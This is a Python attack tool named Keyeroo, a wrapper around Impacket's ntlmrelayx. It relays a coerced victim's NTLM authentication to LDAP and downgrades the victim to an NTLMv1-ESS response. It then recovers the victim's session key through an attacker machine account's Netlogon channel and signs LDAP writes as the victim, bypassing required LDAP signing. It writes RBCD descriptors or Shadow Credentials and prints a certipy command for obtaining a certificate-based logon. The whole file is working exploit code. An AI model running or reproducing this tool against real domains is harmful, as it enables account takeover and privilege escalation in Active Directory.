#!/usr/bin/env python3
"""Keyeroo - LDAP signing bypass via NTLMv1-ESS Netlogon session-key recovery.

A coerced victim's NTLM authentication is relayed to LDAP, but instead of trying to
reuse the attacker's key (which signing defeats), Keyeroo recovers the victim's *own*
NTLM session key through a Netlogon oracle and then acts as the victim with that key:

  1. Open an LDAP connection to the DC (anonymous by default, or authenticated).
  2. Relay the victim's NTLM NEGOTIATE, but hand the victim back a CHALLENGE with the
     TargetInfo stripped, so an NTLMv1-capable victim answers with an NTLMv1-ESS response.
  3. Validate that 24-byte response through an attacker-controlled machine account's
     Netlogon secure channel (NetrLogonSamLogonWithFlags). The DC returns the victim's
     base key; derive the NTLMv1-ESS key-exchange key and decrypt the exported session key.
  4. Complete the victim's Bind, then start a fresh SASL signing layer keyed with the
     recovered session key and send the attacker's LDAP operation in a SEPARATE record.

Because the operation is signed with the victim's genuine key, a fully patched,
signing-required domain controller accepts it. Thin wrapper around Impacket's
ntlmrelayx.py (it starts ntlmrelayx for you).

Requirements:
  - An attacker-controlled machine account (e.g. created via MachineAccountQuota) whose
    password/NT hash you know, for the Netlogon secure channel (-oracle-machine).
  - A victim that emits NTLMv1-ESS (LmCompatibilityLevel <= 2 or a legacy source).
  - The victim coerced to authenticate to -listen-ip over SMB.
"""
import argparse
import hashlib
import os
import random
import runpy
import shutil
import struct
import sys
import time
import uuid
from struct import unpack

from impacket.examples.utils import parse_target


def build_parser():
    parser = argparse.ArgumentParser(
        add_help=True,
        description="Keyeroo - LDAP signing bypass via NTLMv1-ESS Netlogon key recovery",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument(
        "target", action="store",
        help="[[domain/]username[:password]@]<DC host or address>. Credentials are OPTIONAL: "
             "if supplied the initial LDAP connection is authenticated and signed, otherwise "
             "it is anonymous (the attack does not need attacker LDAP creds).",
    )
    parser.add_argument("-ts", action="store_true", help="adds a timestamp to every logging output")
    parser.add_argument("-debug", action="store_true", help="turn DEBUG output ON")

    group = parser.add_argument_group("attacker LDAP connection (optional credentials)")
    group.add_argument("-hashes", action="store", metavar="LMHASH:NTHASH",
                       help="NTLM hashes for the attacker account, if authenticating")
    group.add_argument("-no-pass", action="store_true", help="don't ask for a password")
    group.add_argument("-dc-ip", action="store", metavar="ip address",
                       help="IP address of the target DC (defaults to the target host)")
    group.add_argument("-base-dn", action="store", metavar="DN", required=True,
                       help="search base, e.g. DC=example,DC=com")
    group.add_argument("-domain", action="store", metavar="FQDN", required=True,
                       help="domain FQDN of the victim and oracle machine, e.g. example.com")

    group = parser.add_argument_group("Netlogon session-key oracle (required)")
    group.add_argument("-oracle-machine", action="store", metavar="MACHINE$", required=True,
                       help="attacker-controlled machine account used for the Netlogon "
                            "secure channel")
    creds = group.add_mutually_exclusive_group(required=True)
    creds.add_argument("-oracle-password", action="store", help="the machine account's password")
    creds.add_argument("-oracle-hashes", action="store", metavar="[LMHASH]:NTHASH",
                       help="the machine account's NTLM hash")
    group.add_argument("-oracle-dc-ip", action="store", metavar="ip address",
                       help="DC IP for the Netlogon secure channel (defaults to -dc-ip)")

    group = parser.add_argument_group("relay listener")
    group.add_argument("-ntlmrelayx", action="store", metavar="PATH",
                       help="path to ntlmrelayx.py (default: search PATH)")
    group.add_argument("-listen-ip", action="store", metavar="ip address", required=True,
                       help="attacker listener IP the coerced victim connects to")
    group.add_argument("-victim", action="store", metavar="DOMAIN/account",
                       help="only relay this victim; others are rejected")

    group = parser.add_argument_group("attack (operation executed as the victim)")
    group.add_argument("-modify-dn", action="store", metavar="DN", required=True,
                       help="DN of the directory object to modify as the victim")
    group.add_argument("-attribute", action="store", default="description",
                       help="attribute to write with -value/-value-hex (default: description)")
    payload = group.add_mutually_exclusive_group(required=True)
    payload.add_argument("-value", action="store", help="UTF-8 attribute value")
    payload.add_argument("-value-hex", action="store", help="binary attribute value as hex")
    payload.add_argument("-rbcd-sid", action="store", metavar="SID",
                         help="write an RBCD descriptor granting this SID "
                              "(msDS-AllowedToActOnBehalfOfOtherIdentity)")
    payload.add_argument("-shadow-credentials", action="store_true",
                         help="append a Key Credential (Shadow Credentials) to "
                              "msDS-KeyCredentialLink on -modify-dn and export a PFX")
    group.add_argument("-pfx-out", action="store", default="keyeroo_shadow", metavar="PATH",
                       help="output path prefix for the Shadow Credentials PFX "
                            "(default: keyeroo_shadow -> keyeroo_shadow.pfx)")
    group.add_argument("-pfx-pass", action="store", default="keyeroo", metavar="PASS",
                       help="password for the exported Shadow Credentials PFX (default: keyeroo)")
    return parser


args = build_parser().parse_args()

# Impacket-style credential + target parsing. Credentials are optional (anonymous X otherwise).
domain, username, password, address = parse_target(args.target)
lmhash = nthash = ""
if args.hashes:
    lmhash, _, nthash = args.hashes.partition(":")
if username and not password and not nthash and not args.no_pass:
    from getpass import getpass
    password = getpass("Password:")

authenticated = bool(username)
ldap_host = address
ldap_ip = args.dc_ip or address
oracle_dc_ip = args.oracle_dc_ip or ldap_ip
expected_victim = args.victim.replace("/", "\\") if args.victim else None
SHADOW = {}  # populated by operation_value() when -shadow-credentials is used

from impacket import ntlm
from impacket.dcerpc.v5 import nrpc, rpcrt, transport
from impacket.dcerpc.v5.ndr import NULL
from impacket.examples.ntlmrelayx import clients as relay_clients
from impacket.examples.ntlmrelayx.clients import ldaprelayclient
from impacket.examples.ntlmrelayx.attacks.ldapattack import create_allow_ace, create_empty_sd
from impacket.ldap.ldap import LDAPConnection, get_entry_values
from impacket.ldap.ldapasn1 import BindRequest, LDAPMessage, ModifyRequest, ResultCode
from impacket.nt_errors import STATUS_ACCESS_DENIED
from impacket.spnego import SPNEGO_NegTokenInit, SPNEGO_NegTokenResp, SPNEGOCipher, TypesMech
from pyasn1.codec.ber import decoder, encoder


def configure_smb_listener():
    """Make ntlmrelayx's SMB server advertise signing-required / SMB 3.1.1 so the victim
    performs a signed SMB handshake (closer to real coercion targets)."""
    from impacket.examples.ntlmrelayx.servers import smbrelayserver
    from impacket import smb3

    original = smbrelayserver.SMBRelayServer.SmbNegotiate

    def negotiate(self, conn_id, smb_server, request, isSMB1=False):
        result = original(self, conn_id, smb_server, request, isSMB1)
        if not result or not result[1]:
            return result
        response = result[1][0]["Data"]
        response["SecurityMode"] = (
            smb3.SMB2_NEGOTIATE_SIGNING_ENABLED | smb3.SMB2_NEGOTIATE_SIGNING_REQUIRED
        )
        if isSMB1:
            response["DialectRevision"] = smb3.SMB2_DIALECT_WILDCARD
            response["NegotiateContextCount"] = 0
            response["NegotiateContextOffset"] = 0
            return result
        preauth_data = struct.pack("<HHH", 1, 32, 1) + os.urandom(32)
        preauth = struct.pack(
            "<HHI", smb3.SMB2_PREAUTH_INTEGRITY_CAPABILITIES, len(preauth_data), 0
        ) + preauth_data
        response["DialectRevision"] = smb3.SMB2_DIALECT_311
        response["NegotiateContextCount"] = 1
        context_offset = (0x80 + len(response["Buffer"]) + 7) & ~7
        response["NegotiateContextOffset"] = context_offset
        response["Padding"] = b"\x00" * (context_offset - 0x80 - len(response["Buffer"]))
        response["NegotiateContextList"] = preauth
        return result

    smbrelayserver.SMBRelayServer.SmbNegotiate = negotiate


def resolve_ntlmrelayx():
    for candidate in (args.ntlmrelayx, shutil.which("ntlmrelayx.py"), shutil.which("ntlmrelayx")):
        if candidate and os.path.isfile(candidate):
            return os.path.abspath(candidate)
    raise SystemExit("ntlmrelayx.py not found; pass -ntlmrelayx /path/to/ntlmrelayx.py")


def ldap_message(operation):
    message = LDAPMessage()
    message["messageID"] = random.randrange(1, 2147483647)
    message["protocolOp"].setComponentByType(operation.getTagSet(), operation)
    return encoder.encode(message)


def gss_token(token):
    """Wrap a raw SPNEGO token in an LDAP SASL (GSS-SPNEGO) BindRequest."""
    request = BindRequest()
    request["version"] = 3
    request["name"] = ""
    request["authentication"]["sasl"]["mechanism"] = "GSS-SPNEGO"
    request["authentication"]["sasl"]["credentials"] = token
    return request


def operation_value():
    """Return (attribute, value, operation) for the attacker-chosen ModifyRequest.

    operation is the LDAP modify op: 0=add (append a value to a multi-valued attribute),
    2=replace (overwrite)."""
    if args.shadow_credentials:
        from impacket.examples.ntlmrelayx.utils import shadow_credentials as sc
        key, certificate = sc.createSelfSignedX509Certificate(subject="keyeroo")
        device_id = sc.getDeviceId()
        key_credential = sc.KeyCredential(key, deviceId=device_id, currentTime=sc.getTicksNow())
        dn_binary = sc.toDNWithBinary2String(key_credential.dumpBinary(), args.modify_dn)
        sc.exportPFX(certificate, key, path_to_file=args.pfx_out, password=args.pfx_pass)
        SHADOW["pfx"] = args.pfx_out + ".pfx"
        SHADOW["device_id"] = uuid.UUID(bytes=device_id)
        # msDS-KeyCredentialLink is multi-valued DNWithBinary; append so existing keys survive.
        return "msDS-KeyCredentialLink", dn_binary.encode("utf-8"), 0
    if args.rbcd_sid:
        descriptor = create_empty_sd()
        descriptor["Dacl"].aces.append(create_allow_ace(args.rbcd_sid))
        return "msDS-AllowedToActOnBehalfOfOtherIdentity", descriptor.getData(), 2
    if args.value_hex:
        return args.attribute, bytes.fromhex(args.value_hex), 2
    return args.attribute, args.value.encode(), 2


def replace_attribute(attribute, value, operation=2):
    request = ModifyRequest()
    request["object"] = args.modify_dn
    request["changes"][0]["operation"] = operation  # 0=add, 2=replace
    request["changes"][0]["modification"]["type"] = attribute
    request["changes"][0]["modification"]["vals"].setComponents(value)
    return request


def read_exact(sock, length):
    value = b""
    while len(value) < length:
        chunk = sock.recv(length - len(value))
        if not chunk:
            raise EOFError("connection closed")
        value += chunk
    return value


def read_ldap_pdu(sock):
    """Read one unprotected (plaintext) LDAP PDU, honouring BER long-form length."""
    head = read_exact(sock, 2)
    length = head[1]
    if length & 0x80:
        width = length & 0x7f
        extra = read_exact(sock, width)
        length = int.from_bytes(extra, "big")
        head += extra
    return head + read_exact(sock, length)


def downgrade_challenge(challenge):
    """Return the DC CHALLENGE with TargetInfo stripped so an NTLMv1-capable victim
    answers with an NTLMv1-ESS response (which the Netlogon oracle can validate)."""
    source = ntlm.NTLMAuthChallenge()
    source.fromString(challenge.getData())
    source["flags"] &= ~ntlm.NTLMSSP_NEGOTIATE_TARGET_INFO
    source["TargetInfoFields"] = b""
    return source


def oracle_nthash():
    if args.oracle_hashes:
        return args.oracle_hashes.split(":")[-1]
    return ntlm.NTOWFv1(args.oracle_password).hex()


def recover_victim_key(type3, target_challenge_raw):
    """Validate the victim's NTLMv1-ESS response through the attacker machine account's
    Netlogon secure channel and return the victim's exported session key."""
    machine = args.oracle_machine.rstrip("$")
    machine_account = machine + "$"
    machine_hash = oracle_nthash()

    rpc = transport.DCERPCTransportFactory(rf"ncacn_np:{oracle_dc_ip}[\PIPE\netlogon]")
    rpc.set_credentials(machine_account, "", args.domain, "", machine_hash)
    dce = rpc.get_dce_rpc()
    dce.connect()
    dce.bind(nrpc.MSRPC_UUID_NRPC)
    client_challenge = os.urandom(8)
    server_challenge = nrpc.hNetrServerReqChallenge(dce, NULL, machine + "\x00", client_challenge)["ServerChallenge"]
    session_key = nrpc.ComputeSessionKeyStrongKey("", client_challenge, server_challenge, bytes.fromhex(machine_hash))
    credential = nrpc.ComputeNetlogonCredential(client_challenge, session_key)
    nrpc.hNetrServerAuthenticate3(
        dce, NULL, machine_account + "\x00",
        nrpc.NETLOGON_SECURE_CHANNEL_TYPE.WorkstationSecureChannel,
        machine + "\x00", credential, 0x600FFFFF,
    )
    dce.set_credentials(machine_account, "ignored", args.domain)
    dce.set_auth_type(rpcrt.RPC_C_AUTHN_NETLOGON)
    dce.set_auth_level(rpcrt.RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
    dce.bind(nrpc.MSRPC_UUID_NRPC, alter=1)
    dce.set_session_key(session_key)

    encoding = "utf-16le" if type3["flags"] & ntlm.NTLMSSP_NEGOTIATE_UNICODE else "ascii"
    target_challenge = bytes(ntlm.NTLMAuthChallenge(target_challenge_raw)["challenge"])
    ntlmv1_ess = (len(type3["ntlm"]) == 24 and
                  bool(type3["flags"] & ntlm.NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY))

    request = nrpc.NetrLogonSamLogonWithFlags()
    request["LogonServer"] = "\x00"
    request["ComputerName"] = machine + "\x00"
    request["ValidationLevel"] = nrpc.NETLOGON_VALIDATION_INFO_CLASS.NetlogonValidationSamInfo4
    request["LogonLevel"] = nrpc.NETLOGON_LOGON_INFO_CLASS.NetlogonNetworkInformation
    request["LogonInformation"]["tag"] = request["LogonLevel"]
    info = request["LogonInformation"]["LogonNetwork"]
    info["Identity"]["LogonDomainName"] = type3["domain_name"].decode(encoding)
    info["Identity"]["ParameterControl"] = 0x800
    info["Identity"]["UserName"] = type3["user_name"].decode(encoding)
    info["Identity"]["Workstation"] = ""
    # NTLMv1-ESS folds the 8-byte client challenge into the effective server challenge.
    info["LmChallenge"] = (hashlib.md5(target_challenge + bytes(type3["lanman"])[:8]).digest()[:8]
                           if ntlmv1_ess else target_challenge)
    info["NtChallengeResponse"] = type3["ntlm"]
    info["LmChallengeResponse"] = type3["lanman"]
    request["Authenticator"] = nrpc.ComputeNetlogonAuthenticator(credential, session_key)
    request["ReturnAuthenticator"]["Credential"] = b"\x00" * 8
    request["ReturnAuthenticator"]["Timestamp"] = 0
    request["ExtraFlags"] = 0

    validation = dce.request(request)["ValidationInformation"]["ValidationSam4"]
    base_key = bytes(validation["UserSessionKey"])
    kxkey = (ntlm.hmac_md5(base_key, target_challenge + bytes(type3["lanman"])[:8])
             if ntlmv1_ess else base_key)
    encrypted = bytes(type3["session_key"])
    key = ntlm.generateEncryptedSessionKey(kxkey, encrypted) if encrypted else kxkey
    print(f"[+] Netlogon recovered victim exported session key ({len(key)} bytes)", flush=True)
    return key


class KeyerooLDAPRelayClient(ldaprelayclient.LDAPSRelayClient):
    """ntlmrelayx LDAP client that recovers the victim key and signs as the victim."""

    def initConnection(self):
        self.raw = LDAPConnection(
            f"ldap://{ldap_host}", args.base_dn,
            dstIp=ldap_ip, signing=authenticated, timeout=8,
        )
        if authenticated:
            self.raw.login(username, password, domain, lmhash, nthash, authenticationChoice="sasl")
            print(f"[+] Initial signed LDAP identity: {domain}\\{username}", flush=True)
        else:
            print("[+] Initial LDAP connection is anonymous and unprotected", flush=True)
        self.session = self.raw
        self.target_challenge = None
        return True

    def sendNegotiate(self, negotiateMessage):
        # Relay the victim NEGOTIATE to the DC; keep the real CHALLENGE for the oracle, but
        # return a TargetInfo-stripped CHALLENGE to the victim to force an NTLMv1-ESS answer.
        type1 = ntlm.NTLMAuthNegotiate()
        type1.fromString(negotiateMessage)
        blob = SPNEGO_NegTokenInit()
        blob["MechTypes"] = [TypesMech["NTLMSSP - Microsoft NTLM Security Support Provider"]]
        blob["MechToken"] = type1.getData()
        answer = self.raw.sendReceive(gss_token(blob.getData()))
        result = answer[0]["protocolOp"]["bindResponse"]
        if int(result["resultCode"]) != int(ResultCode("saslBindInProgress")):
            raise RuntimeError(f"GSS-SPNEGO Type 1 rejected: {result['resultCode'].prettyPrint()}")
        challenge = ntlm.NTLMAuthChallenge()
        challenge.fromString(SPNEGO_NegTokenResp(result["serverSaslCreds"].asOctets())["ResponseToken"])
        self.target_challenge = challenge.getData()
        print("[+] Relayed DC challenge back to the victim (TargetInfo stripped for NTLMv1-ESS)", flush=True)
        return downgrade_challenge(challenge)

    def sendAuth(self, authenticateMessageBlob, serverChallenge=None):
        token = authenticateMessageBlob
        if unpack("B", token[:1])[0] == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP:
            token = SPNEGO_NegTokenResp(token)["ResponseToken"]
        type3 = ntlm.NTLMAuthChallengeResponse()
        type3.fromString(token)
        encoding = "utf-16le" if type3["flags"] & ntlm.NTLMSSP_NEGOTIATE_UNICODE else "ascii"
        victim = "%s\\%s" % (type3["domain_name"].decode(encoding), type3["user_name"].decode(encoding))
        if expected_victim and victim.casefold() != expected_victim.casefold():
            print(f"[-] Rejected unexpected victim {victim}", flush=True)
            return None, STATUS_ACCESS_DENIED

        if len(type3["ntlm"]) != 24 or not (type3["flags"] & ntlm.NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY):
            print(f"[-] Victim {victim} did not emit NTLMv1-ESS (nt-response-len={len(type3['ntlm'])}); "
                  "it must be NTLMv1-capable (LmCompatibilityLevel <= 2)", flush=True)
            return None, STATUS_ACCESS_DENIED

        print(f"[+] Victim {victim} emitted NTLMv1-ESS; recovering its session key via oracle", flush=True)
        victim_key = recover_victim_key(type3, self.target_challenge)

        # Complete the victim Bind. Over an authenticated X it is signed with the attacker's
        # key; over an anonymous X it is sent in the clear (the SASL handshake is unprotected).
        final = SPNEGO_NegTokenResp()
        final["ResponseToken"] = token
        if len(authenticateMessageBlob) >= 20 and authenticateMessageBlob[-20:-16] == b"\xa3\x12\x04\x10":
            final["mechListMIC"] = authenticateMessageBlob[-16:]
        bind_message = ldap_message(gss_token(final.getData()))

        if authenticated:
            self.raw._socket.sendall(self.raw.encrypt(bind_message))
            length = struct.unpack(">I", read_exact(self.raw._socket, 4))[0]
            plaintext = self.raw.decrypt(struct.pack(">I", length) + read_exact(self.raw._socket, length))
        else:
            self.raw._socket.sendall(bind_message)
            plaintext = read_ldap_pdu(self.raw._socket)
        result = decoder.decode(plaintext, asn1Spec=LDAPMessage())[0]["protocolOp"].getComponent()
        print(f"[+] Victim Bind -> {result['resultCode'].prettyPrint()}", flush=True)
        if int(result["resultCode"]) != int(ResultCode("success")):
            return None, STATUS_ACCESS_DENIED

        # Re-key the connection with the recovered victim key and send the operation in a
        # fresh, properly signed SASL record -- accepted because it uses the victim's own key.
        self.raw._LDAPConnection__spnego_cipher_blob = SPNEGOCipher(
            flags=type3["flags"], randomSessionKey=victim_key)
        self.raw._LDAPConnection__auth_type = "NTLM-sasl"
        self.raw._LDAPConnection__signing = True
        self.raw._LDAPConnection__binded = True
        self.raw.sequenceNumber = 0

        attribute, value, operation = operation_value()
        self.raw._socket.sendall(self.raw.encrypt(ldap_message(replace_attribute(attribute, value, operation))))
        length = struct.unpack(">I", read_exact(self.raw._socket, 4))[0]
        plaintext = self.raw.decrypt(struct.pack(">I", length) + read_exact(self.raw._socket, length))
        result = decoder.decode(plaintext, asn1Spec=LDAPMessage())[0]["protocolOp"].getComponent()
        print(f"[+] Victim-key operation ({attribute}) -> {result['resultCode'].prettyPrint()} "
              f"{bytes(result['diagnosticMessage']).decode(errors='replace')[:80]}", flush=True)
        if int(result["resultCode"]) == int(ResultCode("success")):
            print(f"[+] SUCCESS: {args.modify_dn} modified as {victim}", flush=True)
            if args.shadow_credentials:
                print(f"[+] Shadow Credentials PFX written to {SHADOW['pfx']} "
                      f"(DeviceID {SHADOW['device_id']}, PFX password '{args.pfx_pass}')", flush=True)
                print(f"[+] Cash in with PKINIT, e.g.:\n"
                      f"    certipy-ad auth -pfx {SHADOW['pfx']} -dc-ip {ldap_ip} "
                      f"-domain {args.domain} -username <sAMAccountName-of-target>", flush=True)

        self._verify(attribute, value)
        return None, STATUS_ACCESS_DENIED

    def _verify(self, attribute, value):
        """Independent signed read-back (only when attacker LDAP creds were supplied)."""
        if not authenticated:
            return
        time.sleep(1)
        try:
            check = LDAPConnection(f"ldap://{ldap_host}", args.base_dn, dstIp=ldap_ip, signing=True, timeout=8)
            check.login(username, password, domain, lmhash, nthash, authenticationChoice="sasl")
            found = []
            for entry in check.search(searchBase=args.modify_dn, scope=0,
                                      searchFilter="(objectClass=*)", attributes=[attribute]):
                found.extend(item.asOctets() for item in get_entry_values(entry, attribute))
            check.close()
            if args.shadow_credentials:
                print(f"[+] read-back: msDS-KeyCredentialLink now has {len(found)} value(s)", flush=True)
            else:
                print("[+] read-back confirms the value is present" if value in found
                      else "[-] read-back did not find the value", flush=True)
        except Exception as error:
            print(f"[!] read-back unavailable: {type(error).__name__}: {error}", flush=True)

    def killConnection(self):
        try:
            self.raw.close()
        except Exception:
            pass
        self.session = None


relay_clients.PROTOCOL_CLIENTS["LDAP"] = KeyerooLDAPRelayClient
configure_smb_listener()

sys.argv = [
    "ntlmrelayx.py", "-t", f"ldap://{ldap_host}", "-ip", args.listen_ip,
    "-smb2support", "--no-multirelay", "--keep-relaying", "--no-http-server",
    "--no-wcf-server", "--no-raw-server", "--no-rpc-server",
    "--no-winrm-server", "--no-mssql-server", "--no-rdp-server",
]
if args.debug:
    sys.argv.append("-debug")
if args.ts:
    sys.argv.append("-ts")
runpy.run_path(resolve_ntlmrelayx(), run_name="__main__")
